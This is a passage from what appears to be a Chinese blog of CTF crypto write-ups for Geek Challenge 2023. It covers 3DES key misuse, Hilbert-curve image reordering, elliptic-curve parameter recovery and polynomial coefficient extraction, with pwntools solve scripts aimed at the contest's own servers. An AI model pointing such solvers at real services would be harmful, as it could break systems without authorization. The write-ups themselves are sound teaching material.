<code>m^sec=sec</code>，<code>pad(sec,8)=sec+b&#39;\x08&#39;*8</code>。</p><p>第一轮：</p><p><code>pad(sec,8)=sec+b&#39;\x08&#39;*8</code>，加密得到 <code>c1^x | c2^x</code>，又由 <code>b&#39;\x08&#39;*8</code> 可求出 <code>c2</code>，得到 <code>x</code>。</p><p>第二轮：</p><p>已知 <code>c&#39;^x</code>，解密得到 <code>flag^x</code>，再异或得到 <code>flag</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">23333</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line">xor = <span class="keyword">lambda</span> a,b: <span class="built_in">bytes</span>([a[i % <span class="built_in">len</span>(a)] ^ b[i % <span class="built_in">len</span>(b)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="built_in">len</span>(a), <span class="built_in">len</span>(b)))])</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">key = bytes_to_long(<span class="string">b&#x27;abcdefgh&#x27;</span>+<span class="string">b&#x27;ijklmnop&#x27;</span>+<span class="string">b&#x27;qrstuvwx&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;flag.\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;msg:\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(m).encode())</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;key:\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(key).encode())</span><br><span class="line"></span><br><span class="line">c_xor = long_to_bytes(<span class="built_in">eval</span>(r.recvline()))</span><br><span class="line">c1_xor,c2_xor = c_xor[:<span class="number">8</span>],c_xor[<span class="number">8</span>:]</span><br><span class="line"></span><br><span class="line">des = DES3.new(long_to_bytes(key),DES3.MODE_ECB)</span><br><span class="line"></span><br><span class="line">c2 = des.encrypt(<span class="string">b&#x27;\x08&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">sec = xor(c2,c2_xor)</span><br><span class="line"><span class="built_in">print</span>(sec)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;flag.\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;key:\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(key).encode())</span><br><span class="line"></span><br><span class="line">flag_c_xor = long_to_bytes(<span class="built_in">eval</span>(r.recvline()))</span><br><span class="line">flag_c = xor(flag_c_xor,sec)</span><br><span class="line">flag_xor = des.decrypt(flag_c)</span><br><span class="line">flag = xor(flag_xor,sec)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;DES_1s_0ut_0f_t1me&#125;o&#x27; </span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="JPGDiff"><a href="#JPGDiff" class="headerlink" title="JPGDiff"></a>JPGDiff</h3><blockquote><p>图片中的字符串即为flag</p></blockquote><p>提示图片为Hilbert曲线，且长图为1*65536的jpg图片，符合8阶Hilbert曲线的节点数。</p><p>按8阶Hilbert曲线的顺序来布置每一个1*1像素，即可还原原始图片。</p><p>利用<a href="https://github.com/galtay/hilbertcurve">hilbertcurve</a>包完成构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hilbertcurve.hilbertcurve <span class="keyword">import</span> HilbertCurve</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image </span><br><span class="line">im_cp = Image.<span class="built_in">open</span>(<span class="string">&quot;ct.png&quot;</span>)</span><br><span class="line">im_new = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">256</span>,<span class="number">256</span>)) </span><br><span class="line"></span><br><span class="line">p=<span class="number">8</span>; n=<span class="number">2</span></span><br><span class="line">hilbert_curve = HilbertCurve(p, n)</span><br><span class="line">distances = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65536</span>))</span><br><span class="line">points = hilbert_curve.points_from_distances(distances)</span><br><span class="line">order = []</span><br><span class="line"><span class="keyword">for</span> point, dist <span class="keyword">in</span> <span class="built_in">zip</span>(points, distances):</span><br><span class="line">    <span class="comment">#print(f&#x27;&#123;dist&#125; = &#123;tuple(point)&#125;&#x27;)</span></span><br><span class="line">    order.append(<span class="built_in">tuple</span>(point))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(order))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    tmp = im_cp.getpixel((<span class="number">0</span>,k))</span><br><span class="line">    im_new.putpixel(order[k],tmp)</span><br><span class="line">    </span><br><span class="line">im_new.save(<span class="string">&#x27;m.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到图片：</p><p><img src="/2023/11/27/match-Geek-Challenge-2023/m-1701104909234-1.png" alt="m"></p><p>flag：<code>SYC&#123;H1LB5RT_C1pher&#125;</code></p><p>​    </p><h3 id="Energetic-Carcano"><a href="#Energetic-Carcano" class="headerlink" title="Energetic_Carcano"></a>Energetic_Carcano</h3><blockquote><p>题目链接：nc 59.110.20.54:8763 <a href="https://en.wikipedia.org/wiki/Elliptic-curve_cryptography">https://en.wikipedia.org/wiki/Elliptic-curve_cryptography</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from sage.all import *</span></span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span> </span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>).encode()</span><br><span class="line">pbits = <span class="number">120</span></span><br><span class="line">abp = <span class="string">&quot;abp&quot;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(): </span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">a,b,p,turn,ans</span>):</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;a&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(a) == ans </span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;b&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(b) == ans</span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;p&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(p) == ans  </span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit() </span><br><span class="line">    <span class="built_in">print</span>(banner) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\nHi Crypto-ers! AL3XEI here. I know you are excellent at math, so I prepared a game for u.&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;In the equation y^2 = x^3+ a*x + b (mod p), 4 points are given. Plz give me the right a, b or p to contine the game.&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Good Luck!\n&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        turn = random.choice(abp) </span><br><span class="line">        p = getPrime(pbits) </span><br><span class="line">        a,b = [next_prime(random.randint(<span class="number">2</span>,p)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>] </span><br><span class="line">        curve = EllipticCurve(GF(p),[a,b]) </span><br><span class="line">        pts = [curve.random_point() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        pts = [(_[<span class="number">0</span>], _[<span class="number">1</span>]) <span class="keyword">for</span> _ <span class="keyword">in</span> pts] </span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> pts:</span><br><span class="line">            <span class="built_in">print</span>(_,end=<span class="string">&quot; &quot;</span>) </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nGive me &#x27;</span>+turn+<span class="string">&quot; :&quot;</span>) </span><br><span class="line">        ans = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)) </span><br><span class="line">        <span class="keyword">if</span> check(a,b,p,turn,ans):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Good! Next challenge-&gt;\n&quot;</span>) </span><br><span class="line">            <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            pbits+=<span class="number">5</span>  </span><br><span class="line">            <span class="keyword">continue</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">            <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">            exit() </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Congrats! Your flag is:&#x27;</span>,flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">    exit() </span><br></pre></td></tr></table></figure></blockquote><p>类似LCG计算 $a,b,p$ 的方法，利用结式计算 $a,b,p$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> sage.matrix.matrix2 <span class="keyword">import</span> Matrix</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resultant</span>(<span class="params">f1, f2, var</span>):</span><br><span class="line">    <span class="keyword">return</span> Matrix.determinant(f1.sylvester_matrix(f2, var))</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="built_in">int</span>(<span class="number">8763</span>))</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Luck!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line"></span><br><span class="line">    (x1,y1),(x2,y2),(x3,y3),(x4,y4) = <span class="built_in">eval</span>(r.recvline().replace(<span class="string">b&#x27;) (&#x27;</span>, <span class="string">b&#x27;), (&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    PR.&lt;a,b,p,k1,k2,k3,k4&gt; = PolynomialRing(ZZ)</span><br><span class="line">    f1 = (y1^<span class="number">2</span>+k1*p)-(x1^<span class="number">3</span>+a*x1+b)</span><br><span class="line">    f2 = (y2^<span class="number">2</span>+k2*p)-(x2^<span class="number">3</span>+a*x2+b)</span><br><span class="line">    f3 = (y3^<span class="number">2</span>+k3*p)-(x3^<span class="number">3</span>+a*x3+b)</span><br><span class="line">    f4 = (y4^<span class="number">2</span>+k4*p)-(x4^<span class="number">3</span>+a*x4+b)</span><br><span class="line">    g1 = resultant(f1, f2, b)</span><br><span class="line">    g2 = resultant(f2, f3, b)</span><br><span class="line">    g3 = resultant(f3, f4, b)</span><br><span class="line">    h1 = resultant(g1, g2, a)</span><br><span class="line">    h2 = resultant(g2, g3, a)</span><br><span class="line">    p_gcd = gcd(h1(p=<span class="number">0</span>),h2(p=<span class="number">0</span>))</span><br><span class="line">    p = <span class="built_in">list</span>(<span class="built_in">zip</span>(*factor(p_gcd)))[<span class="number">0</span>][-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    PR.&lt;a,b&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">    f1 = y1^<span class="number">2</span>-(x1^<span class="number">3</span>+a*x1+b)</span><br><span class="line">    f2 = y2^<span class="number">2</span>-(x2^<span class="number">3</span>+a*x2+b)</span><br><span class="line">    g = resultant(f1, f2, b)</span><br><span class="line">    a = g.univariate_polynomial().roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    b = y1^<span class="number">2</span>-(x1^<span class="number">3</span>+a*x1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(f2(a,b))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;me &#x27;</span>)</span><br><span class="line">    op = r.recv(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(op)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> op == <span class="string">b&#x27;a&#x27;</span>:</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(a).encode())</span><br><span class="line">    <span class="keyword">elif</span> op == <span class="string">b&#x27;b&#x27;</span>:</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(b).encode())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(p).encode())</span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Congrats! Your flag is: b&#x27;SYC&#123;ECC_M4ster&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Just-need-One"><a href="#Just-need-One" class="headerlink" title="Just need One"></a>Just need One</h3><blockquote><p>题目链接：nc 59.110.20.54:2613 One bullet to kill all Outlaws.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>)</span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==DEBUG MODE==&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(): </span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit() </span><br><span class="line">    <span class="built_in">print</span>(banner) </span><br><span class="line">    parms = [random.getrandbits(<span class="number">32</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)] </span><br><span class="line">    res = res = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Give me x calculating f(x) :\n&gt; &#x27;</span>))  </span><br><span class="line">    <span class="keyword">if</span> res &gt;= <span class="number">2</span>**<span class="number">32</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Give me something smaller.\n&quot;</span>)  </span><br><span class="line">        <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">        exit() </span><br><span class="line"></span><br><span class="line">    cnt = <span class="number">0</span>  </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>): </span><br><span class="line">        cnt += <span class="built_in">pow</span>(res,_)*parms[_]  </span><br><span class="line">    <span class="built_in">print</span>(cnt) </span><br><span class="line">    ans = <span class="built_in">input</span>(<span class="string">&#x27;Give me Coefficients :\n&gt; &#x27;</span>) </span><br><span class="line">    ans = [<span class="built_in">int</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> ans.split(<span class="string">&quot;,&quot;</span>)] </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ans == parms:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Congrats! Your flag is:&#x27;</span>,flag)  </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">    exit() </span><br></pre></td></tr></table></figure></blockquote><p>本质是进制转换的计算方法，提供 $x$ 后给出 $\sum\limits_{i=0}^{128}p_ix^i$，求各 $p_i$。利用取余和整除计算即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 